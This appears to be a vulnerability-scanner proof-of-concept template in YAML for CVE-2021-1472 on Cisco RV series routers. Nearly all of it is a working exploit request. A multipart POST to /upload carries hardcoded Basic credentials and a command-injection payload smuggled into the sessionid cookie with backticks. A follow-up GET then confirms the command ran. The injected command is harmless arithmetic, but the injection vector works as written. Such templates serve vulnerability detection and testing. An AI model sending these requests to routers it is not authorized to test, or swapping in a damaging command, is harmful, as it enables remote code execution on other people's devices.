name: poc-yaml-cisco-rv-series-router-cve-2021-1472-rce
manual: true
transport: http
set:
    r1: randomInt(400000, 448000)
    r2: randomInt(400000, 448000)
    rboundary: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /upload
            headers:
                Authorization: Basic YWRtaW46MTIz
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
                Cookie: sessionid='`expr {{r1}} + {{r2}} >/tmp/download/{{r1}}`'
            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file.path\"\r\n\n/tmp/upload.input\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"input\"\r\n\nusa.img\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"filename\"\r\n\ninput.img\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"fileparam\"\r\n\nusa\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"filename\"; filename=\"input.img\"\r\n\nusa\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"option\"\r\n\n1\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"destination\"\r\n\n1\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
            follow_redirects: false
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /download/{{r1}}
            headers:
                Authorization: Basic YWRtaW46MTIz
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
expression: r0() && r1()
detail:
    author: socat
    links:
        - https://packetstormsecurity.com/files/162238/Cisco-RV-Authentication-Bypass-Code-Execution.html
    vulnerability:
        id: CT-151415
        level: critical
    warning: 注意该脚本会上传文件产生一个临时的无害文件
